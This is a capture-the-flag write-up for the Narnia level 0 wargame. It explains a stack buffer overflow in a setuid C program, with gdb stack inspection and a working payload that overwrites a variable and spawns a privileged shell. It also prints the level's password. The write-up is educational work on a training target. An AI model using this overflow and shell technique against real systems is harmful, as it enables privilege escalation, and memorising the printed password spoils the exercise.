## Level0: narnia0

Objective: Get the password to log into **narnia1**.

### How did I pwn it?

1. I directly went to the **/narnia** directory. I found a bunch of **setuid** executables and their corresponding sourcefiles. To get the password for **narnia1**, we had to read the contents of **/etc/narnia_pass/narnia1**. 
		
		narnia0@narnia:/narnia$ ls -l /etc/narnia_pass/narnia1
		-r-------- 1 narnia1 narnia1 11 Nov  9  2017 /etc/narnia_pass/narnia1
		narnia0@narnia:/narnia$

* It can be read only by **narnia1** and no one else. Have a look at **narnia0** executable's permissions. It is setuid to user **narnia1**. So, we have to somehow exploit it and execute commands at higher privileges. 

		narnia0@narnia:/narnia$ ls -l narnia0
		-r-sr-x--- 1 narnia1 narnia0 7568 Nov  9  2017 narnia0
		narnia0@narnia:/narnia$ 

2. This is the sourcecode - **narnia0.c**
		
		#include <stdio.h>
		#include <stdlib.h>

		int main(){
			long val=0x41414141;
			char buf[20];

			printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
			printf("Here is your chance: ");
			scanf("%24s",&buf);

			printf("buf: %s\n",buf);
			printf("val: 0x%08x\n",val);

			if(val==0xdeadbeef){
		        setreuid(geteuid(),geteuid());
				system("/bin/sh");
		    }
			else {
				printf("WAY OFF!!!!\n");
				exit(1);
			}

			return 0;
		}

* **val** = **0x41414141**. We have to change it to **0xdeadbeef**.

* Size of the buffer **buf** is 20. But scanf() is taking int 24 characters(**%24s**). This is something to make note of.

3. Let us execute **narnia0** with a few inputs. 
  
		narnia0@narnia:/narnia$ ./narnia0
		Correct val's value from 0x41414141 -> 0xdeadbeef!
		Here is your chance: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
		buf: aaaaaaaaaaaaaaaaaaaaaaaa
		val: 0x61616161
		WAY OFF!!!!
		narnia0@narnia:/narnia$ ./narnia0
		Correct val's value from 0x41414141 -> 0xdeadbeef!
		Here is your chance: aaaaaaaaaaaaaaaaaaaaaaaa
		buf: aaaaaaaaaaaaaaaaaaaaaaaa
		val: 0x61616161
		WAY OFF!!!!
		narnia0@narnia:/narnia$ 
	
* If we run it in the above manner, it will be difficult to tell what the **length** of the string is. Let us run it like this.
		
		narnia0@narnia:/narnia$ python -c "print 'a' * 15" | ./narnia0
		Correct val's value from 0x41414141 -> 0xdeadbeef!
		Here is your chance: buf: aaaaaaaaaaaaaaa
		val: 0x41414141
		WAY OFF!!!!
		narnia0@narnia:/narnia$ python -c "print 'a' * 20" | ./narnia0
		Correct val's value from 0x41414141 -> 0xdeadbeef!
		Here is your chance: buf: aaaaaaaaaaaaaaaaaaaa
		val: 0x41414100
		WAY OFF!!!!
		narnia0@narnia:/narnia$ python -c "print 'a' * 21" | ./narnia0
		Correct val's value from 0x41414141 -> 0xdeadbeef!
		Here is your chance: buf: aaaaaaaaaaaaaaaaaaaaa
		val: 0x41410061
		WAY OFF!!!!
		narnia0@narnia:/narnia$ python -c "print 'a' * 22" | ./narnia0
		Correct val's value from 0x41414141 -> 0xdeadbeef!
		Here is your chance: buf: aaaaaaaaaaaaaaaaaaaaaa
		val: 0x41006161
		WAY OFF!!!!
		narnia0@narnia:/narnia$ 

4. Exploiting it!

* We are using to python generate input strings, that is the only difference. 
* Observe carefully: 
	* case **'a' * 15** : val = 0x41414141
	* case **'a' * 20** : val = **0x41414100** : Here 1 0x41 is replaced by **0x00**.
	* case **'a' * 21** : val = **0x41410061		: Here, 0x4141 is replaced by **0x6100**	(This is a **little-endian** architecture). The 0x00 is the **NULL** character at the end of the string.

* We can conclude that the variables **buf** and **val** are stored in memory in this manner.
		
		<----------------buf: 20 bytes---------------><val: 4 bytes>
							 	
* In the input, after **20** **a**s, we can have **0xdeadbeef**, which will overwrite existing value 0x41414141.

* But 0xde, 0xad, 0xbe,0xef are all **non-printable characters**. They cannot be typed . For this reason, we will use python to give the input. The input payload is obtained when this python command gets executed.

		python -c "print 'a' * 20 + '\xef\xbe\xad\xde'"

* The order of 0xdeadbeef is reversed in the input string because it is a **little-endian** architecture. 

* Let us input this and see what we get.

		narnia0@narnia:/narnia$ python -c "print 'a' * 20 + '\xef\xbe\xad\xde'" | ./narnia0
		Correct val's value from 0x41414141 -> 0xdeadbeef!
		Here is your chance: buf: aaaaaaaaaaaaaaaaaaaaﾭ�
		val: 0xdeadbeef
		narnia0@narnia:/narnia$ 

* Exploit successful! val = 0xdeadbeef. But we did not get the shell (**/bin/sh**). 

* To get the shell, consider this .

		narnia0@narnia:/narnia$ (python -c "print 'a' * 20 + '\xef\xbe\xad\xde'"; cat) | ./narnia0
		Correct val's value from 0x41414141 -> 0xdeadbeef!
		Here is your chance: buf: aaaaaaaaaaaaaaaaaaaaﾭ�
		val: 0xdeadbeef
		 
		whoami
		narnia1

		id
		uid=14001(narnia1) gid=14000(narnia0) groups=14000(narnia0)

		cat /etc/narnia_pass/narnia1
		efeidiedae

And **GAME OVER!**

* The thought of adding a **cat** command is explained in the **PS** section.

### Password for narnia1: efeidiedae
------------------
**PS**

1. The method used above can be used for simple questions. Generally, there will be a lot of variables out of which one has to be changed, and the value is never printed(unlike the way **val** is printed here) on the console. So, Using this **blackbox** method is not always effective. The following is a systematic method which can be used to solve harder questions also. 

* Load **narnia0** into gdb .
		
		narnia0@narnia:/narnia$ gdb -q narnia0
		Reading symbols from narnia0...(no debugging symbols found)...done.
		(gdb) source /usr/local/peda/peda.py
		gdb-peda$ 
		gdb-peda$ b main
		Breakpoint 1 at 0x8048561
		gdb-peda$ run

* Look at the **<main+10>** th instruction. 

		[-------------------------------------code-------------------------------------]
	   0x8048561 <main+4>:	and    esp,0xfffffff0
	   0x8048564 <main+7>:	sub    esp,0x30
	   0x8048567 <main+10>:	mov    DWORD PTR [esp+0x2c],0x41414141
		=> 0x804856f <main+18>:	mov    DWORD PTR [esp],0x80486a0
	   0x8048576 <main+25>:	call   0x80483f0 <puts@plt>
	   0x804857b <main+30>:	mov    DWORD PTR [esp],0x80486d3
	   0x8048582 <main+37>:	call   0x80483d0 <printf@plt>
	   0x8048587 <main+42>:	lea    eax,[esp+0x18]

* I checked the stack at this point.
		
		gdb-peda$ x/20xw $esp
		0xffffd600:	0x00000001	0x00000000	0xf7e45830	0x0804866b
		0xffffd610:	0x00000001	0xffffd6d4	0xffffd6dc	0x08048641
		0xffffd620:	0xf7fc73dc	0x0804824c	0x08048629	0x41414141
		0xffffd630:	0xf7fc7000	0x00000000	0x00000000	0xf7e2f637
		0xffffd640:	0x00000001	0xffffd6d4	0xffffd6dc	0x00000000
		gdb-peda$ 

* The **address** of **val** = **0xffffd62c**
		
		gdb-peda$ print $esp + 0x2c
		$1 = (void *) 0xffffd62c
		gdb-peda$ x/xw 0xffffd62c
		0xffffd62c:	0x41414141
		gdb-peda$ 

* Let us move on to the string input part. Instruction **<main+57>**. Looking at the arguments pushed into the stack for scanf(), we are interested in the second argument / **buf** , which is the **starting address** of the string. 

		[------------------------------------stack-------------------------------------]
		0000| 0xffffd600 --> 0x80486e9 ("%24s")
		0004| 0xffffd604 --> 0xffffd618 --> 0xffffd6dc --> 0xffffd818 ("XDG_SESSION_ID=13039")

* The **top** of stack has the address of the **format string**. The argument below it is the address of **buf**. From this, **Address** of **buf** = **0xffffd618**.

* Now, let us find the **difference** between the addresses of **val** and **buf**. 
	* **0xffffd618 - 0xffffd62c** = **-20**
	* This means, the **buf** is above **val** in the stack, and as the size of **buf** = 20, there is no gap between the **last byte of **buf** and **val** integer. 

* To get the concept, let us look at the stack. 
			
			0x0804859b in main ()
		gdb-peda$ x/8xw 0xffffd618
		0xffffd618:	0x61616161	0x61616161	0x61616161	0x61616161
		0xffffd628:	0x61616161	0x41006161	0xf7fc7000	0x00000000
		gdb-peda$ 


	* I had entered **22** **a**s. The string has **overflowed** into **val** and overwritten 3 bytes.(0x41414141 has now become 0x41006161)

* Now, it is **100%** clear, that the last 4 bytes of **scanf()** is present to overwrite **val**.

* From here, we can use **python -c** to generate the input string. 

* This method might seem long on post, but it just takes about 5 min to do all the calculations and come up with the right payload. 
* The exploit written using this method will have really high chances of succeeding because, we know internally what is happening unlike the method explained to get the password.

2. Why did I add **cat** after the input payload?

* I started experimenting with simple commands first. I used **echo**.
		
		narnia0@narnia:/narnia$ (python -c "print 'a' * 20 + '\xef\xbe\xad\xde'"; echo "pwnthebox") | ./narnia0
		Correct val's value from 0x41414141 -> 0xdeadbeef!
		Here is your chance: buf: aaaaaaaaaaaaaaaaaaaaﾭ�
		val: 0xdeadbeef
		/bin/sh: 1: pwnthebox: not found
		narnia0@narnia:/narnia$ 
	* I added **echo "pwnthebox"**. Look at the output. It says **/bin/sh: 1: pwnthebox: not found**	
	
	* This simply means, whatever I echo , the shell is trying to execute it. I gave the thing we want. I gave **echo "cat /etc/narnia_pass/narnia1"** and see what happened.
			
			narnia0@narnia:/narnia$ (python -c "print 'a' * 20 + '\xef\xbe\xad\xde'"; echo "cat /etc/narnia_pass/narnia1") | ./narnia0
			Correct val's value from 0x41414141 -> 0xdeadbeef!
			Here is your chance: buf: aaaaaaaaaaaaaaaaaaaaﾭ�
			val: 0xdeadbeef
			efeidiedae
			narnia0@narnia:/narnia$ 
	
	* See, we got the password. But I wanted to get a proper shell. 

* I tried to understand what **echo** is doing. It is taking a string(which we have put), echoing it to **/bin/sh**, which is executing that string. 
* The tool / command which continuously takes in input from console and echo it back is **cat**. Check this out.

		narnia0@narnia:/narnia$ cat 
		asd
		asd
		qwerty
		qwerty
		I wish it works
		I wish it works

		narnia0@narnia:/narnia$ 

* And I put **cat** instead of **echo** in the python command, and it worked like a charm!



			 
